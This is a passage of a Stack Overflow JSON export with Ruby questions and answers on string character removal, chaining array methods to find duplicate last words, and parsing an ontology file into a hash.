"https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558524987, "post_id": 56255759, "comment_id": 99128490, "body": "There is already a solution to this problem in your question. What is actually your question?"}, {"owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "edited": false, "score": 0, "creation_date": 1558525535, "post_id": 56255759, "comment_id": 99128806, "body": "I think they&#39;re asking how to perform the subtraction without converting to an array first"}, {"owner": {"reputation": 628, "user_id": 5954643, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-9tq2jIW1zsk/AAAAAAAAAAI/AAAAAAAABcY/id8Ndc5tWuY/photo.jpg?sz=128", "display_name": "Rajkumar Ulaganadhan", "link": "https://stackoverflow.com/users/5954643/rajkumar-ulaganadhan"}, "edited": false, "score": 0, "creation_date": 1558526145, "post_id": 56255759, "comment_id": 99129120, "body": "yes. without array i need to give the solutions."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1558526514, "post_id": 56255759, "comment_id": 99129332, "body": "<i>&quot;i need to give the solutions&quot;</i> \u2013 sounds as if you are supposed to find the solution yourself."}, {"owner": {"reputation": 628, "user_id": 5954643, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-9tq2jIW1zsk/AAAAAAAAAAI/AAAAAAAABcY/id8Ndc5tWuY/photo.jpg?sz=128", "display_name": "Rajkumar Ulaganadhan", "link": "https://stackoverflow.com/users/5954643/rajkumar-ulaganadhan"}, "edited": false, "score": 0, "creation_date": 1558526653, "post_id": 56255759, "comment_id": 99129410, "body": "yes, i want the result in better way. now got it"}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558537122, "post_id": 56255759, "comment_id": 99136031, "body": "When asked for a clarification of the question, please edit the question rather than elaborating in comments. Questions are intended to stand on their own. That is, readers should not to be expected to read all the comments to understand the question."}, {"owner": {"reputation": 150540, "user_id": 128421, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/71770d043c0f7e3c7bc5f74190015c26?s=128&d=identicon&r=PG", "display_name": "the Tin Man", "link": "https://stackoverflow.com/users/128421/the-tin-man"}, "edited": false, "score": 0, "creation_date": 1558573276, "post_id": 56255759, "comment_id": 99149551, "body": "Please read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>. We&#39;d like to see your attempt to solve the problem, along with relevant input and expected output data, and any errors you&#39;re receiving. Without those it looks like you didn&#39;t try and want us to write the code for you."}], "answers": [{"comments": [{"owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "edited": false, "score": 0, "creation_date": 1558528382, "post_id": 56255823, "comment_id": 99130282, "body": "Why not <code>delete</code> ?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "edited": false, "score": 1, "creation_date": 1558529440, "post_id": 56255823, "comment_id": 99130914, "body": "@steenslag because I have carefully read the OP requirements."}, {"owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "edited": false, "score": 0, "creation_date": 1558531175, "post_id": 56255823, "comment_id": 99132079, "body": "I must be missing something."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "edited": false, "score": 0, "creation_date": 1558531659, "post_id": 56255823, "comment_id": 99132463, "body": "@steenslag <i>\u201c[...] for output1 <code>#angalore</code>\u201d</i> :) the code above produces the output requested."}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 3, "last_activity_date": 1558524481, "creation_date": 1558524481, "answer_id": 56255823, "question_id": 56255759, "link": "https://stackoverflow.com/questions/56255759/how-to-find-and-remove-the-string-from-string-using-ruby/56255823#56255823", "title": "How to find and remove the string from string using ruby?", "body": "<p>Use <a href=\"https://ruby-doc.org/core/String.html#method-i-tr\" rel=\"nofollow noreferrer\"><code>String#tr</code></a>:</p>\n\n<pre><code>main &gt; 'mangalore'.tr 'mc', '#'\n#\u21d2 \"#angalore\"\nmain &gt; 'mc'.tr 'mangalore', '#'\n#\u21d2 \"#c\"\n</code></pre>\n"}], "owner": {"reputation": 628, "user_id": 5954643, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-9tq2jIW1zsk/AAAAAAAAAAI/AAAAAAAABcY/id8Ndc5tWuY/photo.jpg?sz=128", "display_name": "Rajkumar Ulaganadhan", "link": "https://stackoverflow.com/users/5954643/rajkumar-ulaganadhan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "accepted_answer_id": 56255823, "answer_count": 1, "score": 0, "last_activity_date": 1558524510, "creation_date": 1558524254, "last_edit_date": 1558524510, "question_id": 56255759, "link": "https://stackoverflow.com/questions/56255759/how-to-find-and-remove-the-string-from-string-using-ruby", "title": "How to find and remove the string from string using ruby?", "body": "<p>I want to find &amp; remove a string from string. See the examples below,</p>\n\n<p><strong>Input1</strong>: </p>\n\n<blockquote>\n  <p>a = 'mangalore'</p>\n</blockquote>\n\n<p><strong>Input2</strong></p>\n\n<blockquote>\n  <p>b = 'mc'</p>\n</blockquote>\n\n<p><strong>Outputs</strong></p>\n\n<p><strong>b</strong> values should not present in <strong>a</strong> for output1 <code>#angalore</code></p>\n\n<p><strong>a</strong> values should not present in <strong>b</strong> for output2 <code>#c</code></p>\n\n<p><strong>Solutions:</strong> converting string a,b to array then doing a-b &amp; b-a </p>\n\n<p>it will give results. How to implement using string in ruby.</p>\n\n<p>Helps appreciated!</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 2, "creation_date": 1558521394, "post_id": 56254078, "comment_id": 99126596, "body": "Seems like your file contains a header line and space separated values. It might be worth taking a look at Ruby&#39;s <a href=\"http://ruby-doc.org/stdlib-2.6.3/libdoc/csv/rdoc/CSV.html\" rel=\"nofollow noreferrer\">CSV</a> class."}, {"owner": {"reputation": 678, "user_id": 7768165, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-gb_HKOYMQXc/AAAAAAAAAAI/AAAAAAAAAA4/psIFQ0Adofs/photo.jpg?sz=128", "display_name": "stephanmg", "link": "https://stackoverflow.com/users/7768165/stephanmg"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558599091, "post_id": 56254078, "comment_id": 99156384, "body": "Yes, this might be a good idea as well. However my file consists out of one comment string (&quot;# Generated by tool XYZ&quot;) in the first line (No real CSV header thus). Which I can simply skip with the iterator above. Correct?"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1558601340, "post_id": 56254078, "comment_id": 99157699, "body": "Sure, although <code>File.foreach(&#39;file.csv&#39;).drop(1)</code> might be cleaner in that case."}, {"owner": {"reputation": 678, "user_id": 7768165, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-gb_HKOYMQXc/AAAAAAAAAAI/AAAAAAAAAA4/psIFQ0Adofs/photo.jpg?sz=128", "display_name": "stephanmg", "link": "https://stackoverflow.com/users/7768165/stephanmg"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558601497, "post_id": 56254078, "comment_id": 99157803, "body": "Stefan: Fabulous. Thank you."}], "answers": [{"comments": [{"owner": {"reputation": 678, "user_id": 7768165, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-gb_HKOYMQXc/AAAAAAAAAAI/AAAAAAAAAA4/psIFQ0Adofs/photo.jpg?sz=128", "display_name": "stephanmg", "link": "https://stackoverflow.com/users/7768165/stephanmg"}, "edited": false, "score": 0, "creation_date": 1558599428, "post_id": 56254448, "comment_id": 99156565, "body": "How do you call the &amp;:last  syntax? It&#39;s not a method reference but a shorthand notation. Pretzel colon? <a href=\"https://stackoverflow.com/questions/1217088/what-does-mapname-mean-in-ruby\" title=\"what does mapname mean in ruby\">stackoverflow.com/questions/1217088/&hellip;</a>"}, {"owner": {"reputation": 678, "user_id": 7768165, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-gb_HKOYMQXc/AAAAAAAAAAI/AAAAAAAAAA4/psIFQ0Adofs/photo.jpg?sz=128", "display_name": "stephanmg", "link": "https://stackoverflow.com/users/7768165/stephanmg"}, "edited": false, "score": 0, "creation_date": 1558600053, "post_id": 56254448, "comment_id": 99156912, "body": "So, also this should be valid: duplicates = lines.group_by {|e| e.last}.select{|k, v| v.count &gt; 2}.keys if understood the &amp;:method syntax correctly which convert&#39;s basically a proc to a block."}], "tags": [], "owner": {"reputation": 3521, "user_id": 1801379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8623bb58fab9617aa3afe078e6b3e8d9?s=128&d=identicon&r=PG", "display_name": "Babar Al-Amin", "link": "https://stackoverflow.com/users/1801379/babar-al-amin"}, "is_accepted": false, "score": 2, "last_activity_date": 1558519945, "creation_date": 1558519945, "answer_id": 56254448, "question_id": 56254078, "link": "https://stackoverflow.com/questions/56254078/chaining-method-blocks-ruby/56254448#56254448", "title": "Chaining method blocks (Ruby)", "body": "<p>If you don't want to have a intermediate variable and want to do it in a single line, you can write something like this:</p>\n\n<pre><code>duplicates = lines.group_by(&amp;:last).select{|k, v| v.count &gt; 2}.keys\n</code></pre>\n\n<p>For some people, this might hinder readability though! Just depends on your taste.</p>\n"}, {"tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": false, "score": 1, "last_activity_date": 1558520780, "last_edit_date": 1558520780, "creation_date": 1558520452, "answer_id": 56254609, "question_id": 56254078, "link": "https://stackoverflow.com/questions/56254078/chaining-method-blocks-ruby/56254609#56254609", "title": "Chaining method blocks (Ruby)", "body": "<p><code>O(N)</code> solution (single pass) would look like:</p>\n\n<pre><code>lines.each_with_object([[], []]) do |el, (result, temp)|\n  (temp.delete(el) ? result : temp) &lt;&lt; el\nend.first\n</code></pre>\n\n<p>Here we use an intermediate </p>\n\n<hr>\n\n<p>Also, you always might use <a href=\"https://ruby-doc.org/core/Object.html#method-i-tap\" rel=\"nofollow noreferrer\"><code>Object#tap</code></a>:</p>\n\n<pre><code>duplicates =\n  lines.map(&amp;:last).tap do |indices|\n    indices.select { |e| indices.count(e) &gt; 2 }.uniq\n  end\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 678, "user_id": 7768165, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-gb_HKOYMQXc/AAAAAAAAAAI/AAAAAAAAAA4/psIFQ0Adofs/photo.jpg?sz=128", "display_name": "stephanmg", "link": "https://stackoverflow.com/users/7768165/stephanmg"}, "edited": false, "score": 0, "creation_date": 1558619122, "post_id": 56268009, "comment_id": 99167642, "body": "Great examples. Thanks."}], "tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 0, "last_activity_date": 1558586028, "last_edit_date": 1558586028, "creation_date": 1558585095, "answer_id": 56268009, "question_id": 56254078, "link": "https://stackoverflow.com/questions/56254078/chaining-method-blocks-ruby/56268009#56268009", "title": "Chaining method blocks (Ruby)", "body": "<p><strong>Example</strong></p>\n\n<p>Let's apply your code to an example.</p>\n\n<pre><code>str =&lt;&lt;-END\nNow is the\ntime for all\npeople who are\nknown to all\nof us as the\nbest coders are\nexpected to\nlead all\nthose who are\nless experienced\nto greatness\nEND\n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>FName = 'temp'\nFile.write(FName, str)\n  #=&gt; 146\n</code></pre>\n\n<p><strong>Your code</strong></p>\n\n<pre><code>lines = Array.new() \nFile.foreach(FName).with_index do |line, line_num|                 \n  lines.push(line.split(\" \")) if line_num &gt; 0                                 \nend                                                                                  \nlines\n  #=&gt; [[\"time\", \"for\", \"all\"], [\"people\", \"who\", \"are\"], [\"known\", \"to\", \"all\"],\n  #    [\"of\", \"us\", \"as\", \"the\"], [\"best\", \"coders\", \"are\"], [\"expected\", \"to\"],\n  #    [\"lead\", \"all\"], [\"those\", \"who\", \"are\"], [\"less\", \"experienced\"],\n  #    [\"to\", \"greatness\"]] \nindices = lines.map { |el| el.last }                                          \n  #=&gt; [\"all\", \"are\", \"all\", \"the\", \"are\", \"to\", \"all\", \"are\", \"experienced\", \"greatness\"] \nduplicates = indices.select { |e| indices.count(e) &gt; 2 }\n  #=&gt; [\"all\", \"are\", \"all\", \"are\", \"all\", \"are\"] \nduplicates.uniq\n  #=&gt; [\"all\", \"are\"] \n</code></pre>\n\n<p>The object is seen to return an array of all words that appear as the last word of a line (other than the first line) more than twice.</p>\n\n<p><strong>More Ruby-like and more efficient code</strong></p>\n\n<p>We can do that more concisely and efficiently by making a single pass through the file:</p>\n\n<pre><code>first_line = true\nh = Hash.new(0)\nFile.foreach(FName) do |line|\n  if first_line\n    first_line = false\n  else\n    h[line[/\\S+(?=\\n)/]] += 1\n  end\nend\nh.select { |_,count| count &gt; 2 }.keys\n  #=&gt; [\"all\", \"are\"]\n</code></pre>\n\n<p><strong>Steps performed</strong></p>\n\n<p>The steps are as follows.</p>\n\n<pre><code>first_line = true\nh = Hash.new(0)\nFile.foreach(FName) do |line|\n  if first_line\n    first_line = false\n  else\n    h[line[/\\S+(?=\\n)/]] += 1\n  end\nend\nh #=&gt; {\"all\"=&gt;3, \"are\"=&gt;3, \"the\"=&gt;1, \"to\"=&gt;1, \"experienced\"=&gt;1, \"greatness\"=&gt;1}\ng = h.select { |_,count| count &gt; 2 }\n  #=&gt; {\"all\"=&gt;3, \"are\"=&gt;3} \ng.keys\n  #=&gt; [\"all\", \"are\"]\n</code></pre>\n\n<p><strong>Use of <a href=\"http://ruby-doc.org/core-2.5.1/Enumerator.html\" rel=\"nofollow noreferrer\">Enumerator#each_object</a></strong></p>\n\n<p>Rather than defining the hash before <code>File.foreach(..)</code> is executed, its customary to use the method <code>Enumerator#each_object</code>, which allows us to chain the hash that is constructed to that statements that follow:</p>\n\n<pre><code>first_line = true\nFile.foreach(FName).with_object(Hash.new(0)) do |line, h|\n  if first_line\n    first_line = false\n  else\n    h[line[/\\S+(?=\\n)/]] += 1\n  end\nend.select { |_,count| count &gt; 2 }.keys\n  #=&gt; [\"all\", \"are\"] \n</code></pre>\n\n<p><strong>Use of a <em>counting hash</em></strong></p>\n\n<p>I define the hash as follows.</p>\n\n<pre><code>h = Hash.new(0)\n</code></pre>\n\n<p>This uses the form of <a href=\"http://ruby-doc.org/core-2.6.2/Hash.html#method-c-new\" rel=\"nofollow noreferrer\">Hash::new</a> that defines a <em>default value</em> equal to <code>new</code>s argument. If <code>h = Hash.new(0)</code> and <code>h</code> does not have a key <code>k</code>, <code>h[k]</code> returns the default value, zero.  Ruby's parser expands the expression <code>h[k] += 1</code> to:</p>\n\n<pre><code>h[k] = h[k] + 1\n</code></pre>\n\n<p>If <code>h</code> does not have a key <code>k</code>, the expression becomes</p>\n\n<pre><code>h[k] = 0 + 1\n</code></pre>\n\n<p>Note that <code>h[k] = h[k] + 1</code> is shorthand for:</p>\n\n<pre><code>h.[]=(k, h.[](k) + 1)\n</code></pre>\n\n<p>It is the method <code>Hash#[]</code> that defaults to zero, not the method <code>Hash#[]=</code>.</p>\n\n<p><strong>Using a regular expression to extract the last word of each line</strong></p>\n\n<p>One of the lines is</p>\n\n<pre><code>str = \"known to all\\n\"\n</code></pre>\n\n<p>We can use the regular expression <code>r = /\\S+(?=\\n)/</code> to extract the last word:</p>\n\n<pre><code>str[r] #=&gt; \"all\"\n</code></pre>\n\n<p>The regular expression reads, \"match one or more (<code>+</code>) characters that are not whitespace characters (<code>\\S</code>), immediately followed by a newline character. <code>(?=\\n)</code> is a <em>positive lookahead</em>. <code>\"\\n\"</code> must be matched by it is not part of the match returned.</p>\n"}], "owner": {"reputation": 678, "user_id": 7768165, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-gb_HKOYMQXc/AAAAAAAAAAI/AAAAAAAAAA4/psIFQ0Adofs/photo.jpg?sz=128", "display_name": "stephanmg", "link": "https://stackoverflow.com/users/7768165/stephanmg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 192, "favorite_count": 1, "answer_count": 3, "score": 0, "last_activity_date": 1558600639, "creation_date": 1558518807, "last_edit_date": 1558600639, "question_id": 56254078, "link": "https://stackoverflow.com/questions/56254078/chaining-method-blocks-ruby", "title": "Chaining method blocks (Ruby)", "body": "<p>Considering the following code: </p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>    lines = Array.new() \n    File.foreach('file.csv').with_index do |line, line_num|                 \n      lines.push(line.split(\" \")) if line_num &gt; 0                                 \n    end                                                                                  \n\n    indices = lines.map { |el| el.last }                                          \n    duplicates = indices.select{ |e| indices.count(e) &gt; 2 }.uniq\n</code></pre>\n\n<p>Example CSV file looks like this for all who wonder:</p>\n\n<pre><code># Generated by tool XYZ\na b c 1\nd e f 2\ng h i 1\nj k l 4\nm n o 5\np q r 2\ns t u 2\nv w x 1\ny z 0 5\n</code></pre>\n\n<p>Is it possible to chain these two methods blocks (last two lines of code) together? </p>\n"}, {"tags": ["ruby", "parsing"], "comments": [{"owner": {"reputation": 150540, "user_id": 128421, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/71770d043c0f7e3c7bc5f74190015c26?s=128&d=identicon&r=PG", "display_name": "the Tin Man", "link": "https://stackoverflow.com/users/128421/the-tin-man"}, "edited": false, "score": 0, "creation_date": 1558573867, "post_id": 56254057, "comment_id": 99149668, "body": "Welcome to SO! We need sample code that is <i>runnable</i> and demonstrates the problem. You&#39;re asking us to write a test harness to prove/disprove your code and debug it, but that&#39;s your job. <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> will help you understand what we need."}, {"owner": {"reputation": 48049, "user_id": 6419007, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/CwqtX.jpg?s=128&g=1", "display_name": "Eric Duminil", "link": "https://stackoverflow.com/users/6419007/eric-duminil"}, "reply_to_user": {"reputation": 150540, "user_id": 128421, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/71770d043c0f7e3c7bc5f74190015c26?s=128&d=identicon&r=PG", "display_name": "the Tin Man", "link": "https://stackoverflow.com/users/128421/the-tin-man"}, "edited": false, "score": 0, "creation_date": 1558595693, "post_id": 56254057, "comment_id": 99154649, "body": "@theTinMan The question isn&#39;t perfect but it still does a good job at showing what the input is, what the problem is and what OP tried."}], "answers": [{"comments": [{"owner": {"reputation": 45, "user_id": 11509455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9064c2483c6e509e44967095c45b854b?s=128&d=identicon&r=PG&f=1", "display_name": "JesusJPG", "link": "https://stackoverflow.com/users/11509455/jesusjpg"}, "edited": false, "score": 0, "creation_date": 1558560830, "post_id": 56255024, "comment_id": 99146948, "body": "Thanks a lot for your help!! It worked like you said. I also had to get the variable hpo_id out of the scope of the block in order to work I don&#39;t know why, but mainly the problem was in the hash. I really appreciate your answer, I was really stuck in that part of the code."}, {"owner": {"reputation": 48049, "user_id": 6419007, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/CwqtX.jpg?s=128&g=1", "display_name": "Eric Duminil", "link": "https://stackoverflow.com/users/6419007/eric-duminil"}, "reply_to_user": {"reputation": 45, "user_id": 11509455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9064c2483c6e509e44967095c45b854b?s=128&d=identicon&r=PG&f=1", "display_name": "JesusJPG", "link": "https://stackoverflow.com/users/11509455/jesusjpg"}, "edited": false, "score": 0, "creation_date": 1558595577, "post_id": 56255024, "comment_id": 99154599, "body": "@JesusJPG: True I didn&#39;t notice it. If you only leave <code>hpo_id</code> inside the <code>each do |line|</code> block, it will only be defined for the corresponding line, and will be <code>nil</code> for the following lines, even though you&#39;ll need it as a reference. Feel free to upvote/accept the answer if it solved your problem."}], "tags": [], "owner": {"reputation": 48049, "user_id": 6419007, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/CwqtX.jpg?s=128&g=1", "display_name": "Eric Duminil", "link": "https://stackoverflow.com/users/6419007/eric-duminil"}, "is_accepted": false, "score": 0, "last_activity_date": 1558521838, "creation_date": 1558521838, "answer_id": 56255024, "question_id": 56254057, "link": "https://stackoverflow.com/questions/56254057/how-to-parse-data-from-a-file-into-a-hash/56255024#56255024", "title": "How to parse data from a file into a Hash", "body": "<p>There might be more errors hidden in your code, but one problem is indeed that your <code>hpo_data</code> doesn't have default values.</p>\n\n<p>Calling <code>hpo_data[hpo_id][\"replaced_by\"] = line[13..22]</code> fails if <code>hpo_id</code> hasn't been initialized.</p>\n\n<p>You could define <code>hpo_data</code> like this:</p>\n\n<pre><code>hpo_data = Hash.new { |hash, key| hash[key] = {'parents' =&gt; [] } }\n</code></pre>\n\n<p>and remove</p>\n\n<pre><code>hpo_data = Hash.new() #Hash map where i want to store all IDs\n</code></pre>\n\n<p>and</p>\n\n<pre><code>        hpo_data[hpo_id] = Hash.new() #Setting up hash map for that ID \n        hpo_data[hpo_id][\"parents\"] = Array.new()\n</code></pre>\n\n<p>Any time you call <code>hpo_data[hpo_id]</code>, it will be automatically defined to <code>{\"parents\"=&gt;[]}</code>.</p>\n\n<p>As an example:</p>\n\n<pre><code>hpo_data = Hash.new { |hash, key| hash[key] = {'parents' =&gt; [] } }\n# =&gt; {} \nhpo_data[1234]\n# =&gt; {\"parents\"=&gt;[]} \nhpo_data[1234][\"parents\"] &lt;&lt; 6\n# =&gt; [6] \nhpo_data\n# =&gt; {1234=&gt;{\"parents\"=&gt;[6]}} \nhpo_data[42][\"is_obsolete\"] = true\n# =&gt; true \nhpo_data\n# =&gt; {1234=&gt;{\"parents\"=&gt;[6]}, 42=&gt;{\"parents\"=&gt;[], \"is_obsolete\"=&gt;true}}\n</code></pre>\n"}], "owner": {"reputation": 45, "user_id": 11509455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9064c2483c6e509e44967095c45b854b?s=128&d=identicon&r=PG&f=1", "display_name": "JesusJPG", "link": "https://stackoverflow.com/users/11509455/jesusjpg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 58, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558573774, "creation_date": 1558518744, "last_edit_date": 1558573774, "question_id": 56254057, "link": "https://stackoverflow.com/questions/56254057/how-to-parse-data-from-a-file-into-a-hash", "title": "How to parse data from a file into a Hash", "body": "<p>I am trying to parse and store some data from a file into a hash map, not using regular expressions but string comparison, and I am getting some errors I tried to fix but didn't solve the problem.</p>\n\n<p>The file has a structure like:</p>\n\n<pre><code>\"key\" + \"double colon\" + \"value\"\n</code></pre>\n\n<p>in every line. This structure is repeated along the file, and every data has an ID key, almost everything has at least one \"is_a\" key, and may also have \"is_obsolete\" and \"replaced_by\" keys.</p>\n\n<p>I'm trying to parse it like this:</p>\n\n<pre><code>def get_hpo_data(hpofile=\"hp.obo\")\n    hpo_data = Hash.new() #Hash map where i want to store all IDs\n    File.readlines(hpofile).each do |line|\n        if line.start_with? \"id:\" #if line is an ID\n            hpo_id = line[4..13]  #Store ID value\n            hpo_data[hpo_id] = Hash.new() #Setting up hash map for that ID\n            hpo_data[hpo_id][\"parents\"] = Array.new()\n\n        elsif line.start_with? \"is_obsolete:\" #If the ID is obsolete\n            hpo_data[hpo_id][\"is_obsolete\"] = true #store value in the hash\n\n        elsif line.start_with? \"replaced_by:\" #If the ID is obsolete\n            hpo_data[hpo_id][\"replaced_by\"] = line[13..22]\n            #Store the ID term it was replaced by\n\n        elsif line.start_with? \"is_a:\" #If the ID has a parent ID\n            hpo_data[hpo_id][\"parents\"].push(line[6..15])\n            #Store the parent(s) in the array initialized before\n        end\n    end\n    return hpo_data\nend\n</code></pre>\n\n<p>The structure I was expecting to be created is a global hash in which every ID also is a hash with its diferent data (one string data, one boolean and an array with a variable length depending the number of ID parents of that ID term, but I'm getting the following error:</p>\n\n<pre><code>table_combination.rb:224:in `block in get_hpo_data': undefined method `[]=' for nil:NilClass (NoMethodError)\n</code></pre>\n\n<p>This time the error is pointing to the <code>replaced_by</code> <code>elsif</code> statement, but I also get it with any of other <code>elsif</code> statements, so the code does not work parsing \"is_obsolete\", \"replaced_by\" and \"is_a\" properties. If I try deleting these statements, the code succesfully creates the global hash with every ID term as a hash.</p>\n\n<p>I also tried giving default values for every hash but it does not solve the problem. I'm even getting a new error not seen before:</p>\n\n<pre><code>table_combination.rb:233:in '[]': no implicit conversion of String into Integer (TypeError)\n</code></pre>\n\n<p>at this line:</p>\n\n<pre><code>hpo_data[hpo_id][\"parents\"].push(line[6..15])\n</code></pre>\n\n<p>Here is an example of how the file looks like for two terms showing the different keys I want to take care of:</p>\n\n<pre><code>[Term]\nid: HP:0002578\nname: Gastroparesis\ndef: \"Decreased strength of the muscle layer of stomach, which leads to a decreased ability to empty the contents of the stomach despite the absence of obstruction.\" [HPO:probinson]\nsubset: hposlim_core\nsynonym: \"Delayed gastric emptying\" EXACT layperson [ORCID:0000-0001-5208-3432]\nxref: MSH:D018589\nxref: SNOMEDCT_US:196753007\nxref: SNOMEDCT_US:235675006\nxref: UMLS:C0152020\nis_a: HP:0002577 ! Abnormality of the stomach\nis_a: HP:0011804 ! Abnormal muscle physiology\n\n[Term]\nid: HP:0002564\nname: obsolete Malformation of the heart and great vessels\nis_obsolete: true\nreplaced_by: HP:0030680\n</code></pre>\n"}, {"tags": ["ruby", "csv", "whitespace"], "comments": [{"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 1, "creation_date": 1558518232, "post_id": 56253652, "comment_id": 99124844, "body": "<code>CSV</code> stands for <i>comma-separated values</i>. IMO your file is not in <code>CSV</code> format. What exactly is your expected output?"}, {"owner": {"reputation": 606, "user_id": 5143565, "user_type": "registered", "accept_rate": 43, "profile_image": 